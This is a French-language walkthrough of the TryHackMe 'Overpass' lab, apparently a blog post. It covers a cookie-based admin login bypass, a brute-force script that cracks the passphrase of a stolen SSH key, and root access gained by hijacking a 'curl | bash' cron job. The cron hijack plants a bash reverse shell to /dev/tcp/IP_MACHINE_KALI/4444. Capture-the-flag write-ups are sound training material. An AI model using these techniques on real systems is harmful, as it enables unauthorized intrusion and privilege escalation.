---
title: "TryHackMe Room overpass"
seoTitle: "Overpass: TryHackMe Hacking Challenge"
seoDescription: "Explore TryHackMe's Overpass room to learn vulnerability exploitation and flag discovery. Ideal for cybersecurity enthusiasts!"
datePublished: Fri May 09 2025 01:29:31 GMT+0000 (Coordinated Universal Time)
cuid: cmag4c10x000009le6w6s447w
slug: tryhackme-room-overpass
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1746744533776/054e9d9f-f7a6-4ebc-aa7a-49feebb1f5dc.png
tags: tryhackme, thm, thm-writeup, tryhackme-walkthrough

---

Lien de la room: [TryHackMe | Overpass](https://tryhackme.com/room/overpass)

# Flag user.txt

On d√©bute par un scan nmap. On a juste deux ports ouverts.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746744768060/6b544e65-acb6-443c-8b33-fee9e288c9b0.png align="center")

L‚Äôinterface web sur le port 80 nous renvoie une page assez basique

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746744860080/7a949893-4c53-4258-b676-6d04013e89c1.png align="center")

La commande `gobuster dir -u 10.10.140.46 -w /usr/share/wordlists/dirb/big.txt` nous donne un r√©pertoire plut√¥t int√©ressant.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746746045174/f54b7093-ef23-4e4c-957d-201e365be54e.png align="center")

Il s‚Äôagit d‚Äôune page de connexion.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746746015553/bce0f15e-f825-449e-8f37-175d01f50616.png align="center")

On tente de l‚Äôinjection SQL ici. Apr√®s avoir envoy√© des donn√©es al√©atoires, je vois qu‚Äôune requ√™te POST est envoy√©e √† `http://10.10.140.46/api/login`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746748248311/16c90eaf-6b65-4178-ac8a-b6600445c6fd.png align="center")

On va donc utiliser ffuf vers cette adresse avec une liste de payloads disponible sur [Github](https://github.com/Mehdi0x90/Web_Hacking/blob/main/Login%20Bypass.md).

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746749091326/be2f0e59-8a29-46ad-b488-803ccba6ffc2.png align="center")

Mais on a rien comme r√©sultat.

En fouillant un peu plus au niveau de l‚Äôinspecteur, on tombe sur un fichier `login.js`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746749139279/c3e49d3a-c516-4d91-8771-9b55152a1488.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746749199562/f1ba126b-8ae4-4b2f-b0bb-d0390a83cef0.png align="center")

En regardant de plus pr√®s, le bout de code ci-dessous, on voit qu‚Äôil contient une faille plut√¥t logique.

```javascript
if (statusOrCookie === "Incorrect credentials") {
  // √©chec
} else {
  // tout le reste = succ√®s ‚Üí on stocke ce qu‚Äôon a re√ßu comme token
  Cookies.set("SessionToken", statusOrCookie)
  window.location = "/admin"
}
```

Seul le texte `"Incorrect credentials"` est trait√© comme un √©chec. Tout autre r√©ponses valident la connexion et redirigent vers `/admin`. On peut donc en tirer parti et modifier manuellement depuis la console du navigateur.

Ensuite au niveau du stockage, on ajoute un nouveau cookie avec le nom ‚ÄúSessionToken‚Äú en lui attribuant n‚Äôimporte quelle valeur. On recharge ensuite la page.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746797983659/5e9b8b5c-4491-4bc1-9fba-f143c8984cce.png align="center")

On a donc acc√®s √† la page admin et on y voir une cl√© priv√©e, avec un nom d‚Äôutilisateur James. On peut donc potentiellement avoir une connection en ssh.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746751041707/3aad40e9-6ed2-4687-9dee-19d0913eb57f.png align="center")

La cl√© est chiffr√©e en `AES-128-CBC`. Il va donc falloir en extraire une empreinte exploitable par John the Ripper, cracker la passphrase, puis l‚Äôutiliser pour se connecter.

On copie d‚Äôabord l‚Äôenti√®ret√© de la cl√© d√©butant par `-----BEGIN RSA PRIVATE KEY-----`. Avec `ssh2john`, on g√©n√®re le hash.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746752509590/c5503f53-e435-4cbc-813e-718bbf532d08.png align="center")

On le cracke ensuite avec `john`.

ü´§Petit blocage ici. L‚Äôoutil john n‚Äôest pas install√© sur la machine.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746753164125/de98c60b-f247-4a1c-82e5-dc08834894ef.png align="center")

ChatGPT m‚Äôa donc fourni une alternative üòô. Un script permettant de trouver la passphrase de la cl√© priv√©e.

```bash
#!/bin/bash
KEYFILE="priv_key"
WORDLIST="/usr/share/wordlists/rockyou.txt"

while IFS= read -r pass; do
  # Tente de d√©chiffrer ; on envoie stdout/stderr vers /dev/null
  openssl rsa -in "$KEYFILE" -passin pass:"$pass" -out /dev/null 2>/dev/null
  if [ $? -eq 0 ]; then
    echo "[+] Passphrase trouv√©e : $pass"
    exit 0
  fi
done < "$WORDLIST"

echo "[-] Aucune passphrase trouv√©e dans $WORDLIST"
```

√Ä copier dans un fichier `crack.sh` puis le rendre ex√©cutable avec `chmod +x crack.sh`. Lancer ensuite le script avec `./crack.sh`.

On a maintenant la passphrase üòã. On peut se connecter avec l'utilisateur trouv√© un peu plus haut.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746753459960/2325aa1a-4ac5-42ea-a432-9e0aca9dc944.png align="center")

La derni√®re √©tape consite √† rendre la cl√© uniquement lisible par le propri√©taire, car SSH l‚Äôexige

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746798473966/f0d0cfc4-8f90-431e-a933-985e4919f261.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746798493017/411a912f-8f93-4344-bc43-7509ecf41b14.png align="center")

On fait donc `chmod 600 priv_key`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746798538473/4061556a-1e12-4f04-9e5d-eba0d5b9b248.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746798620429/9c18f159-e17b-4124-9e5e-1e5ce7a3e08f.png align="center")

On arrive √† se connecter et on le premier flag ü•≥.

# Flag root.txt

Dans le r√©pertoire de l‚Äôutilisateur `james`, on a un fichier `todo.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746754510029/47eafd9c-09bc-4e60-b382-26a8f6eae6a3.png align="center")

Celui-ci donne des indices plut√¥t int√©ressants: Le mot de passe est peut √™tre quelque part dans un fichier? Ou il peut y avoir aussi un password manager? Il sugg√®re aussi de tester overpass pour macOS.

J‚Äôai tent√© de rechercher un fichier avec overpass, password, ou password manager. Juste les r√©sultats pour overpass sont int√©ressants.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746754648566/bf8c6a25-3a67-4507-aa67-aa82ec4aca89.png align="center")

On a un binaire `/usr/bin/overpass` et un fichier `/.overpass`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746798840302/912f151f-fad6-4051-ac7e-ff602962bd19.png align="center")

On cherche aussi l‚Äôutilitaire crontab qui permet de planifier l‚Äôex√©cution de t√¢ches ou scripts de mani√®re p√©riodique. On voit que la commande `curl overpass.thm/downloads/src/buildscript.sh | bash` s‚Äôex√©cute chaque minute. Il t√©l√©charge le script depuis `overpass.thm/downloads/src/` avec `curl` puis l‚Äôex√©cute avec `bash`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746799003104/9304c38b-a110-4a32-a139-a08f4ddaf91c.png align="center")

On voit aussi que overpass.thm pointe vers la machine m√™me(localhost). Donc si on lance un serveur HTTP sur le port 80, on contr√¥le totalement ce que root t√©l√©charge et ex√©cute.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746805182225/16d5678f-c487-4c0e-a9b1-fd4b87a448ca.png align="center")

On va alors cr√©er un fichier `buildscript.sh` dans le r√©pertoire `www/downloads/src/`

```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/IP_MACHINE_KALI/4444 0>&1
```

On change ensuite les permissions du fichier `chmod 777 buildscript.sh` puis on lance un listener sur notre machine avec `nc -lvnp 4444`.